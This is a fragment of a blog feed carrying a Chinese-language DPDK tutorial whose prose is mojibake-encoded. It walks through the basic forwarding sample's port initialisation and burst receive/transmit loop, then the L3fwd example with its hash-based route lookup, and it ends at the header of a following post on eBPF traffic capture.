class="keyword">uint16_t</span> nb_tx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_txconf *tx_conf)</span></span></span><br></pre></td></tr></table></figure><p>ç½‘å£è®¾ç½®ï¼šåˆå§‹åŒ–é…ç½®ç»“æŸåï¼Œå¯åŠ¨ç«¯å£<code>int rte_eth_dev_start(uint8_t port_id)ï¼›</code>å®Œæˆåï¼Œè¯»å– MAC åœ°å€ï¼Œæ‰“å¼€ç½‘å¡çš„æ··æ‚æ¨¡å¼è®¾ç½®ï¼Œå…è®¸æ‰€æœ‰æŠ¥æ–‡è¿›å…¥ã€‚</p><p><code>port_init</code>å¤„ç†é€»è¾‘å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main functional part of port initialization. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">port_init(<span class="keyword">uint16_t</span> port, struct rte_mempool *mbuf_pool)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_conf</span> <span class="title">port_conf</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> rx_rings = <span class="number">1</span>, tx_rings = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_rxd = RX_RING_SIZE;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_txd = TX_RING_SIZE;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">uint16_t</span> q;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_dev_info</span> <span class="title">dev_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_txconf</span> <span class="title">txconf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rte_eth_dev_is_valid_port(port))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;port_conf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rte_eth_conf));</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_info_get(port, &amp;dev_info);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error during getting device (port %u) info: %s\n"</span>,</span><br><span class="line">port, strerror(-retval));</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dev_info.tx_offload_capa &amp; RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)</span><br><span class="line">port_conf.txmode.offloads |=</span><br><span class="line">RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Configure the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_dev_configure(port, rx_rings, tx_rings, &amp;port_conf);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &amp;nb_rxd, &amp;nb_txd);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate and set up 1 RX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; rx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_rx_queue_setup(port, q, nb_rxd,</span><br><span class="line">rte_eth_dev_socket_id(port), <span class="literal">NULL</span>, mbuf_pool);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">txconf = dev_info.default_txconf;</span><br><span class="line">txconf.offloads = port_conf.txmode.offloads;</span><br><span class="line"><span class="comment">/* Allocate and set up 1 TX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; tx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_tx_queue_setup(port, q, nb_txd,</span><br><span class="line">rte_eth_dev_socket_id(port), &amp;txconf);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Starting Ethernet port. 8&lt; */</span></span><br><span class="line">retval = rte_eth_dev_start(port);</span><br><span class="line"><span class="comment">/* &gt;8 End of starting of ethernet port. */</span></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Display the port MAC address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_ether_addr</span> <span class="title">addr</span>;</span></span><br><span class="line">retval = rte_eth_macaddr_get(port, &amp;addr);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Port %u MAC: %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8</span><br><span class="line">   <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">"\n"</span>,</span><br><span class="line">port, RTE_ETHER_ADDR_BYTES(&amp;addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Enable RX in promiscuous mode for the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_promiscuous_enable(port);</span><br><span class="line"><span class="comment">/* End of setting RX port in promiscuous mode. */</span></span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç½‘å£æ”¶å‘æŠ¥æ–‡å¾ªç¯æ”¶å‘åœ¨<code>lcore_main</code>ä¸­å®ç°ï¼Œä¸ºä¿è¯æ€§èƒ½ï¼Œé¦–å…ˆæ£€æµ‹CPUä¸ç½‘å¡çš„Socketæ˜¯å¦æœ€ä¼˜é€‚é…ã€‚æ•°æ®æ”¶å‘å¾ªç¯éå¸¸ç®€å•ï¼Œä¸ºé«˜é€ŸæŠ¥æ–‡è¿›å‡ºå®šä¹‰äº†burstçš„æ”¶å‘å‡½æ•°å¦‚ä¸‹ï¼Œå››ä¸ªå‚æ•°æ„ä¹‰éå¸¸ç›´è§‚ï¼šç«¯å£ã€é˜Ÿåˆ—ã€æŠ¥æ–‡ç¼“å†²åŒºä»¥åŠæ”¶å‘åŒ…æ•°ã€‚</p><p>åŸºäºç«¯å£é˜Ÿåˆ—çš„æŠ¥æ–‡æ”¶å‘å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_rx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **rx_pkts, <span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_tx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **tx_pkts, <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br></pre></td></tr></table></figure><p>è¿™å°±æ„æˆäº†æœ€åŸºæœ¬çš„DPDKæŠ¥æ–‡æ”¶å‘å±•ç¤ºã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„ä¸æ¶‰åŠä»»ä½•å…·ä½“ç½‘å¡å½¢æ€ï¼Œè½¯ä»¶æ¥å£å¯¹ç¡¬ä»¶æ²¡æœ‰ä¾èµ–ã€‚</p><p><code>lcore_main</code>å¤„ç†é€»è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Basic forwarding application lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> __rte_noreturn <span class="keyword">void</span></span><br><span class="line">lcore_main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint16_t</span> port;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check that the port is on the same NUMA node as the polling thread</span></span><br><span class="line"><span class="comment"> * for best performance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port)</span><br><span class="line"><span class="keyword">if</span> (rte_eth_dev_socket_id(port) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">rte_eth_dev_socket_id(port) !=</span><br><span class="line">(<span class="keyword">int</span>)rte_socket_id())</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WARNING, port %u is on remote NUMA node to "</span></span><br><span class="line"><span class="string">"polling thread.\n\tPerformance will "</span></span><br><span class="line"><span class="string">"not be optimal.\n"</span>, port);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nCore %u forwarding packets. [Ctrl+C to quit]\n"</span>,</span><br><span class="line">rte_lcore_id());</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main work of application loop. 8&lt; */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Receive packets on a port and forward them on the paired</span></span><br><span class="line"><span class="comment"> * port. The mapping is 0 -&gt; 1, 1 -&gt; 0, 2 -&gt; 3, 3 -&gt; 2, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get burst of RX packets, from first port of pair. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mbuf</span> *<span class="title">bufs</span>[<span class="title">BURST_SIZE</span>];</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_rx = rte_eth_rx_burst(port, <span class="number">0</span>,</span><br><span class="line">bufs, BURST_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_rx == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Send burst of TX packets, to second port of pair. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_tx = rte_eth_tx_burst(port ^ <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">bufs, nb_rx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any unsent packets. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_tx &lt; nb_rx)) &#123;</span><br><span class="line"><span class="keyword">uint16_t</span> buf;</span><br><span class="line"><span class="keyword">for</span> (buf = nb_tx; buf &lt; nb_rx; buf++)</span><br><span class="line">rte_pktmbuf_free(bufs[buf]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of loop. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="L3fwd"><a href="#L3fwd" class="headerlink" title="L3fwd"></a>L3fwd</h5><p>L3fwdæ˜¯å‘å¸ƒDPDKæ€§èƒ½æµ‹è¯•çš„ä¾‹å­ã€‚å¦‚æœå°†PCIEæ’æ§½ä¸Šå¡«æ»¡é«˜é€Ÿç½‘å¡ï¼Œå°†ç½‘å£ä¸å¤§æµé‡æµ‹è¯•ä»ªè¡¨è¿æ¥ï¼Œä»–èƒ½å±•ç¤ºåœ¨åŒè·¯æœåŠ¡å™¨å¹³å°å…·å¤‡<code>200Gbit/s</code>çš„è½¬å‘èƒ½åŠ›ã€‚æ•°æ®åŒ…è¢«æ”¶å…¥ç³»ç»Ÿåï¼Œä¼šæŸ¥è¯¢IPæŠ¥æ–‡å¤´éƒ¨ï¼Œä¾æ®ç›®æ ‡åœ°å€è¿›è¡Œè·¯ç”±æŸ¥æ‰¾ï¼Œå‘ç°ç›®çš„ç«¯å£ï¼Œä¿®æ”¹IPå¤´éƒ¨åï¼Œå°†æŠ¥æ–‡ä»ç›®çš„ç«¯å£é€å‡ºã€‚è·¯ç”±æŸ¥æ‰¾æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºç›®æ ‡IPåœ°å€çš„å®Œå…¨åŒ¹é…(<code>exact match</code>)ï¼Œå¦ä¸€ç§æ˜¯åŸºäºè·¯ç”±è¡¨çš„æœ€é•¿æ©ç åŒ¹é…(<code>Longest Prefix Match,LPM</code>)ã€‚</p><p>å¯åŠ¨è¿™ä¸ªä¾‹å­ï¼ŒæŒ‡å®šå‘½ä»¤å‚æ•°æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/l3fwd [EAL options] -- -p PORTMASK [-P] --config(port,queue,lcore) [,(port,queue,lcore)]</span><br></pre></td></tr></table></figure><p>å‘½ä»¤å‚æ•°åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä»¥â€â€”â€œä¸ºåˆ†ç•Œçº¿ï¼Œåˆ†ç•Œçº¿å³è¾¹çš„å‚æ•°æ˜¯ä¸‰å±‚è½¬å‘çš„ç§æœ‰å‘½ä»¤é€‰é¡¹ã€‚å·¦è¾¹æ˜¯DPDKçš„<code>EAL Options</code></p><ul><li>[EAL Options]æ˜¯DPDKè¿è¡Œç¯å¢ƒçš„è¾“å…¥é…ç½®é€‰é¡¹ï¼Œè¾“å…¥å‘½ä»¤ä¼šäº¤ç»™<code>rte_eal_init</code>å¤„ç†</li><li>PORTMASKä¾æ®æ©ç é€‰æ‹©ç«¯å£ï¼ŒDPDKå¯åŠ¨æ—¶ä¼šæœç´¢ç³»ç»Ÿè®¤è¯†çš„PCIeè®¾å¤‡ï¼Œä¾æ®é»‘ç™½åå•åŸåˆ™æ¥å†³å®šæ˜¯å¦æ¥ç®¡ï¼Œæ—©æœŸç‰ˆæœ¬å¯èƒ½ä¼šæ¥ç®¡æ‰€æœ‰ç«¯å£ï¼Œæ–­å¼€ç½‘ç»œè¿æ¥ã€‚ç°åœ¨å¯é€šè¿‡è„šæœ¬ç»‘å®šã€‚</li><li>configé€‰é¡¹æŒ‡å®š(port,queue,lcore)ï¼Œç”¨æŒ‡å®šçº¿ç¨‹å¤„ç†å¯¹åº”çš„ç«¯å£çš„é˜Ÿåˆ—ã€‚è¦å®ç°<code>200Gbit/s</code>çš„è½¬å‘ï¼Œéœ€è¦å¤§é‡çº¿ç¨‹(æ ¸)å‚ä¸ï¼Œå¹¶è¡Œè½¬å‘ã€‚</li></ul><p>ä¸»çº¿ç¨‹<code>main</code>çš„å¤„ç†æµç¨‹å¦‚ä¸‹æ‰€è¿°ï¼š</p><ul><li>åˆå§‹åŒ–è¿è¡Œç¯å¢ƒï¼š<code>rte_eal_init(argc,argv)</code></li><li>åˆ†æå…¥å‚ï¼š<code>parse_args(argc,argv)</code></li><li>åˆå§‹åŒ–lcoreä¸porté…ç½®</li><li>ç«¯å£ä¸é˜Ÿåˆ—åˆå§‹åŒ–</li><li>ç«¯å£å¯åŠ¨ï¼Œä½¿èƒ½æ··æ‚æ¨¡å¼</li><li>å¯åŠ¨ä»çº¿ç¨‹ï¼Œä»¤å…¶è¿è¡Œ<code>main_loop()</code></li></ul><p>ä»çº¿ç¨‹æ‰§è¡Œ<code>main_loop()</code>çš„å¤„ç†æµç¨‹å¦‚ä¸‹æ‰€è¿°ï¼š</p><ul><li>è¯»å–è‡ªå·±çš„lcoreä¿¡æ¯å®Œæˆé…ç½®</li><li>è¯»å–å…³è”çš„æ¥æ”¶ä¸å‘é€é˜Ÿåˆ—ä¿¡æ¯</li><li>è¿›è¡Œå¾ªç¯å¤„ç†ï¼š<ul><li>å‘æŒ‡å®šé˜Ÿåˆ—æ‰¹é‡å‘é€æŠ¥æ–‡</li><li>ä»æŒ‡å®šé˜Ÿåˆ—æ‰¹é‡æ¥æ”¶æŠ¥æ–‡</li><li>æ‰¹é‡è½¬å‘æ¥æ”¶åˆ°çš„æŠ¥æ–‡</li></ul></li></ul><p>æ‰¹é‡è½¬å‘æ¥æ”¶åˆ°çš„æŠ¥æ–‡æ˜¯å¤„ç†çš„ä¸»ä½“ï¼Œæä¾›äº†åŸºäºHashçš„å®Œå…¨åŒ¹é…è½¬å‘ï¼Œä¹Ÿå¯ä»¥åŸºäºLPMè¿›è¡Œè½¬å‘ã€‚è½¬å‘è·¯ç”±æŸ¥æ‰¾æ–¹å¼å¯ä»¥ç”±ç¼–è¯‘é…ç½®é€‰æ‹©ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­åŒ…æ‹¬åŸºäº<code>multi buffer</code>åŸç†çš„ä»£ç å®ç°ï¼Œåœ¨<code>#if(ENABLE_MULTI_BUFFER_OPTIMIZE == 1)</code>çš„è·¯å¾„ä¸‹ï¼Œä¸€æ¬¡å¤„ç†8ä¸ªæŠ¥æ–‡ã€‚å®ƒçš„å®ç°æœ‰æ•ˆåˆ©ç”¨äº†å¤„ç†å™¨å†…éƒ¨çš„ä¹±åºæ‰§è¡Œå’Œå¹¶è¡Œå¤„ç†èƒ½åŠ›ï¼Œèƒ½æ˜¾è‘—æé«˜è½¬å‘æ€§èƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j += <span class="number">8</span>) &#123;</span><br><span class="line">     <span class="keyword">uint32_t</span> pkt_type =</span><br><span class="line">     pkts_burst[j]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">1</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">2</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">3</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">4</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">5</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">6</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">7</span>]-&gt;packet_type;</span><br><span class="line"> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV4) &#123;</span><br><span class="line"> simple_ipv4_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV6) &#123;</span><br><span class="line"> simple_ipv6_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">1</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">2</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">3</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">4</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">5</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">6</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">7</span>],portid, qconf);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (; j &lt; nb_rx ; j++) &#123;</span><br><span class="line"> l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ä¾æ®IPå¤´éƒ¨çš„äº”å…ƒç»„ä¿¡æ¯ï¼Œåˆ©ç”¨<code>rte_hash_lookup</code>æ¥æŸ¥è¯¢ç›®æ ‡ç«¯å£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mask0 = _mm_set_epi32(ALL_32_BITS, ALL_32_BITS, ALL_32_BITS, BIT_8_TO_15);</span><br><span class="line">ipv4_hdr = (<span class="keyword">uint8_t</span> *)ipv4_hdr + offsetof(struct ipv4_hdr, time_to_live);</span><br><span class="line">__m128i data = _mm_loadu_si128((__m128i*)(ipv4_hdr));</span><br><span class="line"><span class="comment">/* Get 5 tuple: dst port, src port, dst IP address, src IP address and protocol */</span></span><br><span class="line">key.xmm = _mm_and_si128(data, mask0);</span><br><span class="line"><span class="comment">/* Find destination port */</span></span><br><span class="line">ret = rte_hash_lookup(ipv4_l3fwd_lookup_struct, (<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;key);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">uint8_t</span>)((ret &lt; <span class="number">0</span>)? portid : ipv4_l3fwd_out_if[ret]);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç åœ¨è¯»å–æŠ¥æ–‡å¤´éƒ¨ä¿¡æ¯æ—¶ï¼Œå°†æ•´ä¸ªå¤´éƒ¨å¯¼å…¥äº†åŸºäºSSEçš„çŸ¢é‡å¯„å­˜å™¨(128ä½å®½)ï¼Œå¹¶å¯¹å†…éƒ¨è¿›è¡Œäº†æ©ç mask0è¿ç®—ï¼Œå¾—åˆ°keyï¼Œç„¶åæŠŠkeyä½œä¸ºå…¥å£å‚æ•°é€å…¥<code>rte_hash_lookup</code>è¿ç®—ã€‚</p><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>DPDKç«‹è¶³é€šç”¨å¤šæ ¸å¤„ç†å™¨ï¼Œç»è¿‡è½¯ä»¶ä¼˜åŒ–çš„ä¸æ–­æ‘¸ç´¢ï¼Œå®è·µå‡ºä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„æ–¹æ³•ï¼Œåœ¨IAæ•°æ®åŒ…å¤„ç†ä¸Šå–å¾—é‡å¤§æ€§èƒ½çªç ´ã€‚éšç€è½¯ç¡¬ä»¶è§£è€¦çš„è¶‹åŠ¿ï¼ŒDPDKå·²ç»æˆä¸ºNFVäº‹å®ä¸Šçš„æ•°æ®é¢åŸºçŸ³ã€‚ç€çœ¼æœªæ¥ï¼Œæ— è®ºæ˜¯ç½‘ç»œèŠ‚ç‚¹ï¼Œè¿˜æ˜¯è®¡ç®—èŠ‚ç‚¹æˆ–æ˜¯å­˜å‚¨èŠ‚ç‚¹ï¼Œè¿™äº›äº‘æœåŠ¡çš„åŸºç¡€è®¾æ–½éƒ½æœ‰æœºä¼šå› DPDKè€Œå¾—åˆ°åŠ é€Ÿã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;ä»€ä¹ˆæ˜¯DPDKï¼Ÿå¯¹äºç”¨æˆ·ï¼Œæ˜¯æ€§èƒ½å‡ºè‰²çš„æŠ¥æ•°æ®å¤„ç†åŠ é€Ÿè½¯ä»¶åº“ï¼›å¯¹äºå¼€å‘è€…ï¼Œæ˜¯ä¸€ä¸ªå®è·µåŒ…å¤„ç†æ–°æƒ³æ³•çš„åˆ›æ–°å·¥åœºï¼›å¯¹äºæ€§èƒ½è°ƒä¼˜è€…ï¼Œæ˜¯ä¸€ä¸ªç»ä½³çš„æˆæœåˆ†
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>eBPFæµé‡æ•è·å®è·µ</title>
    <link href="elssm.github.io/2022/10/05/eBPF%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/10/05/eBPFæµé‡æ•è·å®è·µ/</id>
    <published>2022-10-05T03:23:09.000Z</published>
    <updated>2022-10-05T03:27:48.155Z</updated>
    
